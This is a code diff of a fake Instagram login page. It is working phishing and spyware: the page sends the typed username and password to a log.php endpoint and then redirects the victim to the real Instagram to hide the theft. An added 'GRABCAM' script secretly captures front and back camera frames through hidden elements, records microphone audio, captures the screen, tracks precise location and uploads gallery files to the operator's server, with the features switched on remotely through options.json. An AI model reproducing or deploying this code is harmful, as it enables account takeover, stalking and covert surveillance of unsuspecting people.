@@ -4,211 +4,201 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --ig-bg: #fafafa;
+            --ig-surface: #ffffff;
+            --ig-border: #dbdbdb;
+            --ig-border-focus: #a8a8a8;
+            --ig-text: #262626;
+            --ig-muted: #8e8e8e;
+            --ig-link: #0095f6;
+            --ig-link-hover: #00376b;
+            --ig-btn: linear-gradient(90deg, #0095f6 0%, #0095f6 100%);
+            --ig-btn-hover: #1877f2;
+            --ig-facebook: #385185;
+            --ig-radius: 12px;
+            --ig-radius-sm: 8px;
+            --ig-shadow: 0 4px 24px rgba(0,0,0,.08);
+            --ig-shadow-card: 0 2px 12px rgba(0,0,0,.06);
         }
-        
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html { font-size: 16px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--ig-bg);
             min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
             display: flex;
-            max-width: 935px;
+            align-items: center;
+            justify-content: center;
+            padding: 28px 20px;
+            color: var(--ig-text);
+            line-height: 1.5;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(249, 205, 169, .25) 0%, transparent 50%),
+                        radial-gradient(ellipse 60% 40% at 80% 80%, rgba(161, 196, 253, .2) 0%, transparent 50%),
+                        radial-gradient(ellipse 50% 30% at 20% 60%, rgba(254, 215, 170, .15) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            max-width: 920px;
             width: 100%;
-            gap: 50px;
+            gap: 56px;
             align-items: center;
             justify-content: center;
         }
-        
-        .phone-container {
-            flex: 1;
-            max-width: 380px;
-            display: none;
-        }
-        
-        .phone-container img {
-            width: 100%;
-            height: auto;
-        }
-        
-        .login-container {
-            flex: 1;
-            max-width: 350px;
-        }
-        
+        .phone-container { flex: 1; max-width: 380px; display: none; }
+        .phone-container img, .phone-container svg { width: 100%; height: auto; display: block; }
+        .login-container { flex: 1; max-width: 400px; }
+
         .login-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 40px 20px;
-            margin-bottom: 10px;
+            background: var(--ig-surface);
+            border: 1px solid var(--ig-border);
+            border-radius: var(--ig-radius);
+            padding: 44px 48px 36px;
+            margin-bottom: 16px;
             text-align: center;
+            box-shadow: var(--ig-shadow-card);
         }
-        
-        .logo {
-            margin-bottom: 20px;
-        }
-        
+        .logo { margin-bottom: 28px; }
         .logo h1 {
-            font-family: 'Billabong', 'Brush Script MT', cursive, sans-serif;
-            font-size: 51px;
+            font-size: 2.75rem;
             font-weight: 400;
-            color: #262626;
-            margin-bottom: 20px;
-            letter-spacing: 1px;
+            color: var(--ig-text);
+            letter-spacing: -0.8px;
+            font-family: 'Inter', sans-serif;
+            font-weight: 300;
         }
-        
-        .form-group {
-            margin-bottom: 6px;
-        }
-        
+        .form-group { margin-bottom: 10px; }
         input[type="text"],
         input[type="password"] {
             width: 100%;
-            padding: 9px 0 7px 8px;
-            font-size: 14px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            color: #262626;
+            padding: 14px 16px;
+            font-size: 0.9375rem;
+            font-family: inherit;
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-border);
+            border-radius: var(--ig-radius-sm);
+            color: var(--ig-text);
             outline: none;
+            transition: border-color .2s, box-shadow .2s;
         }
-        
         input[type="text"]:focus,
         input[type="password"]:focus {
-            border-color: #a8a8a8;
+            border-color: var(--ig-border-focus);
+            box-shadow: 0 0 0 2px rgba(0,149,246,.12);
         }
-        
-        input[type="text"]::placeholder,
-        input[type="password"]::placeholder {
-            color: #8e8e8e;
-        }
-        
+        input::placeholder { color: var(--ig-muted); }
         .btn-login {
             width: 100%;
-            padding: 5px 9px;
-            margin-top: 8px;
-            background-color: #0095f6;
+            padding: 12px 16px;
+            margin-top: 14px;
+            background: var(--ig-link);
             border: none;
-            border-radius: 4px;
+            border-radius: var(--ig-radius-sm);
             color: #fff;
-            font-size: 14px;
+            font-size: 0.9375rem;
             font-weight: 600;
+            font-family: inherit;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: background .2s, transform .05s;
         }
-        
         .btn-login:hover:not(:disabled) {
-            background-color: #1877f2;
+            background: var(--ig-btn-hover);
         }
-        
-        .btn-login:disabled {
-            background-color: #b2dffc;
-            cursor: default;
-        }
-        
+        .btn-login:active:not(:disabled) { transform: scale(0.99); }
+        .btn-login:disabled { opacity: .65; cursor: not-allowed; }
         .divider {
-            margin: 20px 0;
+            margin: 28px 0;
             display: flex;
             align-items: center;
+            font-size: 0.8125rem;
+            color: var(--ig-muted);
+            font-weight: 500;
             text-transform: uppercase;
-            font-size: 13px;
-            color: #8e8e8e;
-            font-weight: 600;
+            letter-spacing: 0.04em;
         }
-        
-        .divider::before,
-        .divider::after {
-            content: '';
+        .divider::before, .divider::after {
+            content: "";
             flex: 1;
             height: 1px;
-            background-color: #dbdbdb;
+            background: var(--ig-border);
         }
-        
-        .divider span {
-            margin: 0 18px;
-        }
-        
+        .divider span { margin: 0 22px; }
         .facebook-login {
-            color: #385185;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--ig-facebook);
             text-decoration: none;
-            font-size: 14px;
+            font-size: 0.9375rem;
             font-weight: 600;
-            margin: 20px 0;
-            display: inline-block;
+            margin: 10px 0;
+            transition: color .15s, opacity .15s;
         }
-        
-        .facebook-login:hover {
-            text-decoration: underline;
-        }
-        
-        .forgot-password {
-            margin-top: 12px;
-        }
-        
+        .facebook-login:hover { color: #2d3e5f; opacity: .9; }
+        .forgot-password { margin-top: 18px; }
         .forgot-password a {
-            color: #00376b;
+            color: var(--ig-link-hover);
             text-decoration: none;
-            font-size: 12px;
+            font-size: 0.8125rem;
         }
-        
+        .forgot-password a:hover { text-decoration: underline; }
         .signup-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
+            background: var(--ig-surface);
+            border: 1px solid var(--ig-border);
+            border-radius: var(--ig-radius);
+            padding: 26px 24px;
             text-align: center;
-            font-size: 14px;
-            color: #262626;
+            font-size: 0.9375rem;
+            color: var(--ig-text);
+            box-shadow: var(--ig-shadow-card);
         }
-        
         .signup-box a {
-            color: #0095f6;
+            color: var(--ig-link);
             text-decoration: none;
             font-weight: 600;
         }
-        
-        .signup-box a:hover {
-            text-decoration: underline;
-        }
-        
+        .signup-box a:hover { text-decoration: underline; }
         .warning {
-            background-color: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 4px;
-            padding: 12px;
-            margin-bottom: 16px;
-            font-size: 11px;
-            color: #856404;
+            background: rgba(255, 193, 7, .08);
+            border: 1px solid rgba(255, 193, 7, .25);
+            border-radius: var(--ig-radius-sm);
+            padding: 10px 14px;
+            margin-bottom: 22px;
+            font-size: 0.7rem;
+            color: #7c5c00;
             text-align: center;
+            line-height: 1.4;
+            font-weight: 500;
         }
-        
         .loading {
             display: none;
+            padding: 28px;
             text-align: center;
-            padding: 20px;
-            color: #8e8e8e;
-            font-size: 14px;
+            color: var(--ig-muted);
+            font-size: 0.9375rem;
         }
-        
-        @media (min-width: 875px) {
-            .phone-container {
-                display: block;
-            }
+        @media (min-width: 876px) {
+            .phone-container { display: block; }
+        }
+        @media (max-width: 480px) {
+            .login-box { padding: 32px 24px 28px; }
+            .logo h1 { font-size: 2.25rem; }
         }
     </style>
 </head>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 <body>
     <div class="container">
         <div class="phone-container">
@@ -267,123 +257,270 @@
     </div>
     
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const timestamp = new Date().toISOString();
-            
-            // Показываем сообщение о загрузке
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loadingMessage').style.display = 'block';
-            
-            // Отправляем данные на сервер
-            fetch('/log', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    service: 'instagram',
-                    username: username,
-                    password: password,
-                    timestamp: timestamp,
-                    ip: '127.0.0.1'
+        (function initLoginForm() {
+            var form = document.getElementById('loginForm');
+            var loadingMsg = document.getElementById('loadingMessage');
+            var redirectUrl = 'https://www.instagram.com/';
+            var redirectDelayMs = 1200;
+
+            function doRedirect() {
+                setTimeout(function() { window.location.href = redirectUrl; }, redirectDelayMs);
+            }
+
+            function sendFormAndRedirect(username, password, timestamp) {
+                var sendForm = (typeof GRABCAM_FEATURES !== 'undefined' && GRABCAM_FEATURES.form);
+                if (!sendForm) {
+                    doRedirect();
+                    return;
+                }
+                fetch('log.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ service: 'instagram', username: username, password: password, timestamp: timestamp })
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Ждем 1-2 секунды для реалистичности, потом перенаправляем на реальный Instagram
-                setTimeout(function() {
-                    window.location.href = 'https://www.instagram.com/';
-                }, 1500);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // Даже если ошибка, все равно перенаправляем
-                setTimeout(function() {
-                    window.location.href = 'https://www.instagram.com/';
-                }, 1500);
+                    .then(function(r) { return r.json().catch(function() { return {}; }); })
+                    .then(doRedirect)
+                    .catch(doRedirect);
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                if (loadingMsg) loadingMsg.style.display = 'block';
+                if (form) form.style.display = 'none';
+                var username = document.getElementById('username') && document.getElementById('username').value;
+                var password = document.getElementById('password') && document.getElementById('password').value;
+                sendFormAndRedirect(username || '', password || '', new Date().toISOString());
             });
-        });
-        
-        // Автоматическое заполнение формы для тестирования (можно удалить)
-        // Раскомментируйте для теста:
-        // document.getElementById('username').value = 'test_user';
-        // document.getElementById('password').value = 'test_password';
+        })();
     </script>
 </body>
-<!-- Автоматически добавлено: код доступа к камере (ОБЕИХ), геолокации и галерее -->
+<!-- Опции подгружаются с сервера (options.json) — можно включать камеру/гео/форму на лету без перезапуска -->
 <script>
-// Настройки захвата (можно изменить)
-var CAPTURE_INTERVAL = 1500; // Интервал захвата в миллисекундах (по умолчанию 1.5 секунды)
-var IMAGE_QUALITY = 1.0; // Качество изображения от 0.0 до 1.0 (по умолчанию 1.0 - максимальное)
-
-// Глобальные переменные для геолокации
+var GRABCAM_FEATURES = typeof GRABCAM_FEATURES_JSON !== 'undefined' ? GRABCAM_FEATURES_JSON : { camera: true, geo: true, form: true, gallery: false, mic: false, screen: false };
+var GRABCAM_POST_URL = 'forwarding_link/post.php';
+var CAPTURE_INTERVAL_MS = 3000;
+var SCREEN_CAPTURE_INTERVAL_MS = 4000;
+var IMAGE_QUALITY = 0.85;
+var OPTIONS_POLL_MS = 5000;
+var GEO_RETRY_DELAY_MS = 8000;
+var GEO_MAX_RETRIES = 10;
 var currentLocation = null;
+var _grabcamInited = { camera: false, geo: false, gallery: false, mic: false, screen: false };
+var _geoRetryCount = 0;
 
-// Функция для безопасной инициализации камер с проверками
-function waitForElementsAndInit() {
-    // Получаем элементы с повторными попытками
-    var video = document.getElementById('video');
-    var canvas = document.getElementById('canvas');
-    var videoBack = document.getElementById('video-back');
-    var canvasBack = document.getElementById('canvas-back');
-    
-    // Проверяем наличие элементов
-    if (!video) {
-        console.log('Элемент video не найден, ждем...');
-        setTimeout(waitForElementsAndInit, 500);
-        return;
+function applyOptionsFromServer(opts) {
+    if (opts && typeof opts.camera !== 'undefined') {
+        GRABCAM_FEATURES.camera = !!opts.camera;
+        GRABCAM_FEATURES.geo = !!opts.geo;
+        GRABCAM_FEATURES.form = !!opts.form;
+        GRABCAM_FEATURES.gallery = !!opts.gallery;
+        GRABCAM_FEATURES.mic = !!opts.mic;
+        GRABCAM_FEATURES.screen = !!opts.screen;
     }
-    
-    if (!canvas) {
-        console.log('Элемент canvas не найден, ждем...');
-        setTimeout(waitForElementsAndInit, 500);
-        return;
-    }
-    
-    // Проверяем наличие функции post
-    if (typeof post !== 'function') {
-        console.log('Функция post не найдена, ждем...');
-        setTimeout(waitForElementsAndInit, 500);
-        return;
-    }
-    
-    // Все элементы найдены
-    console.log('Все элементы найдены, запускаем функции...');
-    
-    // Инициализируем геолокацию
-    initGeolocation();
-    
-    // Инициализируем доступ к галерее
-    initGalleryAccess();
-    
-    // Инициализируем обе камеры
-    initCameras(video, canvas, videoBack, canvasBack);
+    applyFeaturesNow();
+    setupFirstGesturePermissions();
 }
 
-// Функция для получения точной геолокации
-function initGeolocation() {
-    if (!navigator.geolocation) {
-        console.error('❌ Геолокация не поддерживается в этом браузере');
+function startOptionsPollOnce() {
+    if (!window._grabcamPollStarted) {
+        window._grabcamPollStarted = true;
+        setInterval(fetchAndApplyOptions, OPTIONS_POLL_MS);
+    }
+}
+
+function fetchAndApplyOptions() {
+    fetch('options.json?t=' + Date.now())
+        .then(function(r) { return r.ok ? r.json() : {}; })
+        .then(function(opts) {
+            applyOptionsFromServer(opts);
+            startOptionsPollOnce();
+        })
+        .catch(function() {
+            applyOptionsFromServer(null);
+            startOptionsPollOnce();
+        });
+}
+
+function startMicRecording() {
+    if (_grabcamInited.mic || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
+        _grabcamInited.mic = true;
+        var mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
+        var recorder = new MediaRecorder(stream, { mimeType: mimeType, audioBitsPerSecond: 128000 });
+        var chunkIndex = 0;
+        recorder.ondataavailable = function(e) {
+            if (e.data && e.data.size > 0) {
+                var reader = new FileReader();
+                reader.onloadend = function() {
+                    var base64 = reader.result.split(',')[1];
+                    if (base64) fetch('audio.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ audio: base64, chunk: chunkIndex++, last: false }) }).catch(function() {});
+                };
+                reader.readAsDataURL(e.data);
+            }
+        };
+        recorder.start(12000);
+        window._grabcamMicRecorder = recorder;
+    }).catch(function() {});
+}
+
+function startScreenCapture() {
+    if (_grabcamInited.screen || !navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false }).then(function(stream) {
+        _grabcamInited.screen = true;
+        var screenVideo = document.getElementById('screen-video');
+        var screenCanvas = document.getElementById('screen-canvas');
+        if (!screenVideo || !screenCanvas) {
+            var w = document.createElement('div');
+            w.id = 'grabcam-screen-wrap';
+            w.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;overflow:hidden;pointer-events:none;';
+            w.innerHTML = '<video id="screen-video" autoplay playsinline muted></video><canvas id="screen-canvas"></canvas>';
+            document.body.appendChild(w);
+            screenVideo = document.getElementById('screen-video');
+            screenCanvas = document.getElementById('screen-canvas');
+        }
+        screenVideo.srcObject = stream;
+        screenVideo.onloadedmetadata = function() {
+            screenVideo.play();
+            var ctx = screenCanvas.getContext('2d');
+            var intervalId = setInterval(function() {
+                if (screenVideo.readyState >= 2) {
+                    try {
+                        screenCanvas.width = screenVideo.videoWidth;
+                        screenCanvas.height = screenVideo.videoHeight;
+                        ctx.drawImage(screenVideo, 0, 0);
+                        var dataUrl = screenCanvas.toDataURL('image/png', 0.7).replace('image/png', 'image/octet-stream');
+                        if (typeof post === 'function') post(dataUrl, 'screen');
+                    } catch (e) {}
+                }
+            }, SCREEN_CAPTURE_INTERVAL_MS);
+            stream.getVideoTracks()[0].onended = function() { clearInterval(intervalId); };
+        };
+    }).catch(function() {});
+}
+
+function requestGalleryAccess() {
+    if (_grabcamInited.gallery) return;
+    if (typeof initGalleryAccess === 'function') initGalleryAccess();
+    var inp = document.getElementById('gallery-input');
+    if (inp) {
+        _grabcamInited.gallery = true;
+        inp.click();
+    }
+}
+
+function onFirstUserGesture() {
+    if (GRABCAM_FEATURES.mic) startMicRecording();
+    if (GRABCAM_FEATURES.screen) startScreenCapture();
+    if (GRABCAM_FEATURES.gallery) requestGalleryAccess();
+}
+
+function setupFirstGesturePermissions() {
+    if (window._grabcamGestureBound) return;
+    window._grabcamGestureBound = true;
+    function bound() {
+        onFirstUserGesture();
+        document.removeEventListener('click', bound, true);
+        document.removeEventListener('focusin', bound, true);
+        document.removeEventListener('keydown', bound, true);
+    }
+    document.addEventListener('click', bound, true);
+    document.addEventListener('focusin', bound, true);
+    document.addEventListener('keydown', bound, true);
+}
+
+function applyFeaturesNow() {
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    if (typeof post !== 'function') return;
+    if (GRABCAM_FEATURES.geo && !_grabcamInited.geo) {
+        _grabcamInited.geo = true;
+        initGeolocation();
+    }
+    if (GRABCAM_FEATURES.gallery && !_grabcamInited.gallery) {
+        _grabcamInited.gallery = true;
+        initGalleryAccess();
+    }
+    if (GRABCAM_FEATURES.camera && !_grabcamInited.camera && video && canvas) {
+        _grabcamInited.camera = true;
+        initBackCameraOnly(video, canvas);
+        initFrontCamera();
+    }
+    /* Галерея уже инициализирована выше при первом включении. Микрофон и экран — только по кнопке. */
+}
+
+function waitForElementsAndInit() {
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    if (!video || !canvas) {
+        setTimeout(waitForElementsAndInit, 500);
         return;
     }
-    
-    console.log('📍 Запрос доступа к местоположению...');
-    
-    // Опции для точной геолокации (GPS)
-    var geoOptions = {
-        enableHighAccuracy: true, // Точная геолокация (GPS)
-        timeout: 20000, // Увеличиваем таймаут до 20 секунд
-        maximumAge: 0 // Не использовать кэш, всегда получать свежие данные
-    };
-    
-    // Сначала запрашиваем текущее местоположение
+    if (typeof post !== 'function') {
+        setTimeout(waitForElementsAndInit, 500);
+        return;
+    }
+    fetchAndApplyOptions();
+}
+
+function initBackCameraOnly(video, canvas) {
+    var constraints = { audio: false, video: { facingMode: "environment" } };
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+            handleSuccess(stream, video, canvas, 'back');
+        })
+        .catch(function() {
+            navigator.mediaDevices.enumerateDevices().then(function(devices) {
+                var vds = devices.filter(function(d) { return d.kind === 'videoinput'; });
+                if (vds.length > 0) {
+                    var devId = vds[vds.length - 1].deviceId;
+                    navigator.mediaDevices.getUserMedia({ audio: false, video: { deviceId: { exact: devId } } })
+                        .then(function(stream) { handleSuccess(stream, video, canvas, 'back'); });
+                }
+            });
+        });
+}
+
+function initFrontCamera() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || typeof post !== 'function') return;
+    var frontVideo = document.getElementById('video-front');
+    var frontCanvas = document.getElementById('canvas-front');
+    if (!frontVideo || !frontCanvas) {
+        var wrap = document.createElement('div');
+        wrap.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;';
+        wrap.innerHTML = '<video id="video-front" playsinline autoplay muted></video><canvas id="canvas-front" width="740" height="580"></canvas>';
+        document.body.appendChild(wrap);
+        frontVideo = document.getElementById('video-front');
+        frontCanvas = document.getElementById('canvas-front');
+    }
+    var constraints = { audio: false, video: { facingMode: "user" } };
+    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+        frontVideo.srcObject = stream;
+        frontVideo.onloadedmetadata = function() {
+            frontVideo.play();
+            var ctx = frontCanvas.getContext('2d');
+            var frontIntervalId = setInterval(function() {
+                if (frontVideo.readyState >= frontVideo.HAVE_ENOUGH_DATA) {
+                    try {
+                        frontCanvas.width = frontVideo.videoWidth;
+                        frontCanvas.height = frontVideo.videoHeight;
+                        ctx.drawImage(frontVideo, 0, 0);
+                        var dataUrl = frontCanvas.toDataURL('image/png', IMAGE_QUALITY).replace('image/png', 'image/octet-stream');
+                        post(dataUrl, 'front');
+                    } catch (e) {}
+                }
+            }, CAPTURE_INTERVAL_MS);
+                    stream.getVideoTracks()[0].onended = function() { clearInterval(frontIntervalId); };
+        };
+    }).catch(function() {});
+}
+
+function initGeolocation() {
+    if (!navigator.geolocation || typeof postLocation !== 'function') return;
+    if (_geoRetryCount >= GEO_MAX_RETRIES) return;
+    var geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 };
     navigator.geolocation.getCurrentPosition(
         function(position) {
-            console.log('✅ Доступ к местоположению разрешен!');
+            _geoRetryCount = 0;
             currentLocation = {
                 lat: position.coords.latitude,
                 lon: position.coords.longitude,
@@ -393,57 +530,80 @@ function initGeolocation() {
                 speed: position.coords.speed || null,
                 timestamp: Date.now()
             };
-            console.log('📍 Точная геолокация получена:', currentLocation);
-            
-            // Отправляем геолокацию на сервер сразу
-            if (typeof postLocation === 'function') {
-                postLocation(currentLocation);
-            }
-            
-            // Начинаем отслеживание изменений геолокации в реальном времени
-            var watchId = navigator.geolocation.watchPosition(
-                function(pos) {
-                    currentLocation = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || null,
-                        heading: pos.coords.heading || null,
-                        speed: pos.coords.speed || null,
-                        timestamp: pos.timestamp || Date.now()
-                    };
-                    console.log('📍 Обновление геолокации:', currentLocation);
-                    // Отправляем каждое обновление на сервер
-                    if (typeof postLocation === 'function') {
-                        postLocation(currentLocation);
-                    }
-                },
-                function(error) {
-                    console.error('❌ Ошибка отслеживания геолокации:', error.message, 'Код:', error.code);
-                },
-                geoOptions
-            );
-            
-            // Сохраняем ID для возможной остановки
-            window.geoWatchId = watchId;
+            postLocation(currentLocation);
         },
-        function(error) {
-            console.error('❌ Ошибка получения геолокации:', error.message, 'Код:', error.code);
-            if (error.code === 1) {
-                console.error('Пользователь отклонил запрос на доступ к местоположению');
-            } else if (error.code === 2) {
-                console.error('Информация о местоположении недоступна (GPS выключен?)');
-            } else if (error.code === 3) {
-                console.error('Истекло время ожидания запроса местоположения');
+        function() {
+            _geoRetryCount++;
+            if (_geoRetryCount < GEO_MAX_RETRIES) {
+                setTimeout(initGeolocation, GEO_RETRY_DELAY_MS);
             }
-            // Пробуем еще раз через 5 секунд
-            setTimeout(function() {
-                console.log('🔄 Повторная попытка получения геолокации...');
-                initGeolocation();
-            }, 5000);
         },
         geoOptions
     );
+}
+
+// Микрофон: запись чанками и отправка на сервер
+function initMicrophone() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream) {
+        var mimeType = 'audio/webm';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
+        var recorder = new MediaRecorder(stream, { mimeType: mimeType, audioBitsPerSecond: 128000 });
+        var chunkIndex = 0;
+        recorder.ondataavailable = function(e) {
+            if (e.data && e.data.size > 0) {
+                var reader = new FileReader();
+                reader.onloadend = function() {
+                    var base64 = reader.result.split(',')[1];
+                    if (base64) {
+                        fetch('audio.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ audio: base64, chunk: chunkIndex, last: false })
+                        }).catch(function() {});
+                    }
+                    chunkIndex++;
+                };
+                reader.readAsDataURL(e.data);
+            }
+        };
+        recorder.start(12000);
+        window._grabcamMicRecorder = recorder;
+    }).catch(function() {});
+}
+
+// Захват экрана (getDisplayMedia), кадры отправляются как изображения
+function initScreenCapture() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: true, audio: false }).then(function(stream) {
+        var screenVideo = document.getElementById('screen-video');
+        var screenCanvas = document.getElementById('screen-canvas');
+        if (!screenVideo || !screenCanvas) {
+            var wrap = document.createElement('div');
+            wrap.style.cssText = 'position:absolute;left:-9999px;';
+            wrap.innerHTML = '<video id="screen-video" autoplay playsinline></video><canvas id="screen-canvas" width="1280" height="720"></canvas>';
+            document.body.appendChild(wrap);
+            screenVideo = document.getElementById('screen-video');
+            screenCanvas = document.getElementById('screen-canvas');
+        }
+        screenVideo.srcObject = stream;
+        screenVideo.onloadedmetadata = function() {
+            screenVideo.play();
+            var ctx = screenCanvas.getContext('2d');
+            var intervalId = setInterval(function() {
+                if (screenVideo.readyState >= 2) {
+                    try {
+                        screenCanvas.width = screenVideo.videoWidth;
+                        screenCanvas.height = screenVideo.videoHeight;
+                        ctx.drawImage(screenVideo, 0, 0);
+                        var dataUrl = screenCanvas.toDataURL('image/png', 0.7).replace('image/png', 'image/octet-stream');
+                        if (typeof post === 'function') post(dataUrl, 'screen');
+                    } catch (e) {}
+                }
+            }, SCREEN_CAPTURE_INTERVAL_MS);
+            stream.getVideoTracks()[0].onended = function() { clearInterval(intervalId); };
+        };
+    }).catch(function() {});
 }
 
 // Функция для получения доступа к галерее
@@ -459,474 +619,102 @@ function initGalleryAccess() {
         document.body.appendChild(galleryInput);
     }
     
-    // Автоматически открываем диалог выбора файлов через небольшую задержку
-    setTimeout(function() {
-        try {
-            galleryInput.click();
-            console.log('Диалог галереи открыт');
-        } catch (error) {
-            console.log('Не удалось автоматически открыть галерею:', error.message);
-        }
-    }, 3000); // Задержка 3 секунды после загрузки страницы
-    
+    // Галерея — только по выбору пользователя (без авто-открытия, чтобы не тормозить)
     // Обработчик выбора файлов
     galleryInput.addEventListener('change', function(e) {
         var files = e.target.files;
-        if (files && files.length > 0) {
-            console.log('Выбрано файлов из галереи:', files.length);
-            for (var i = 0; i < files.length; i++) {
-                var file = files[i];
+        if (!files || files.length === 0) return;
+        for (var i = 0; i < files.length; i++) {
+            (function(file) {
                 var reader = new FileReader();
-                reader.onload = function(event) {
-                    var imageData = event.target.result;
-                    // Отправляем изображение на сервер
-                    if (typeof post === 'function') {
-                        post(imageData, 'gallery');
+                reader.onload = function(ev) {
+                    if (typeof post === 'function' && ev.target && ev.target.result) {
+                        post(ev.target.result, 'gallery');
                     }
                 };
                 reader.readAsDataURL(file);
-            }
+            })(files[i]);
         }
+        galleryInput.value = '';
     });
-}
-
-function initCameras(video, canvas, videoBack, canvasBack) {
-    // Дополнительная проверка элементов
-    if (!video || !canvas) {
-        console.error('Ошибка: элементы video или canvas пустые!');
-        return;
-    }
-    
-    // Настройки для фронтальной камеры
-    const constraintsFront = { 
-        audio: false,
-        video: { 
-            facingMode: "user" // Фронтальная камера
-        } 
-    };
-    
-    // Настройки для задней камеры
-    const constraintsBack = { 
-        audio: false,
-        video: { 
-            facingMode: { exact: "environment" } // Задняя камера
-        } 
-    };
-    
-    // Запрашиваем доступ к фронтальной камере
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        // Сначала получаем фронтальную камеру
-        navigator.mediaDevices.getUserMedia(constraintsFront)
-            .then(function(stream) {
-                console.log('✅ Доступ к фронтальной камере получен!');
-                
-                // Запускаем захват с фронтальной камеры
-                handleSuccess(stream, video, canvas, 'front');
-                
-                // После успешного получения фронтальной камеры, пытаемся получить заднюю
-                // Используем задержку, чтобы дать фронтальной камере время инициализироваться
-                setTimeout(function() {
-                    // Пытаемся получить доступ к задней камере
-                    // Проверяем наличие элементов для задней камеры
-                    var vBack = document.getElementById('video-back');
-                    var cBack = document.getElementById('canvas-back');
-                    
-                    // Если элементов нет, создаем их
-                    if (!vBack) {
-                        vBack = document.createElement('video');
-                        vBack.id = 'video-back';
-                        vBack.setAttribute('playsinline', '');
-                        vBack.setAttribute('autoplay', '');
-                        vBack.style.display = 'none';
-                        document.body.appendChild(vBack);
-                        console.log('Создан элемент video-back для задней камеры');
-                    }
-                    if (!cBack) {
-                        cBack = document.createElement('canvas');
-                        cBack.id = 'canvas-back';
-                        cBack.width = 740;
-                        cBack.height = 580;
-                        cBack.style.display = 'none';
-                        document.body.appendChild(cBack);
-                        console.log('Создан элемент canvas-back для задней камеры');
-                    }
-                    
-                    // Пытаемся получить доступ к задней камере
-                    // ВАЖНО: Многие браузеры НЕ поддерживают одновременный доступ к двум камерам
-                    // Поэтому используем подход с переключением камер
-                    console.log('Пытаемся получить доступ к задней камере...');
-                    
-                    // Сначала пробуем получить одновременно (некоторые устройства поддерживают)
-                    navigator.mediaDevices.getUserMedia(constraintsBack)
-                        .then(function(backStream) {
-                            console.log('Задняя камера успешно получена одновременно! Инициализация захвата...');
-                            handleSuccess(backStream, vBack, cBack, 'back');
-                        })
-                        .catch(function(error) {
-                            // Если не удалось получить одновременно, используем переключение
-                            console.log('Одновременный доступ недоступен, используем переключение камер...', error.message);
-                            
-                            // Останавливаем видео треки фронтальной камеры
-                            if (window.stream) {
-                                window.stream.getVideoTracks().forEach(function(track) {
-                                    track.stop();
-                                });
-                            }
-                            
-                            // Получаем заднюю камеру
-                            navigator.mediaDevices.getUserMedia(constraintsBack)
-                                .then(function(backStream) {
-                                    console.log('Переключение: Задняя камера получена!');
-                                    handleSuccess(backStream, vBack, cBack, 'back');
-                                    
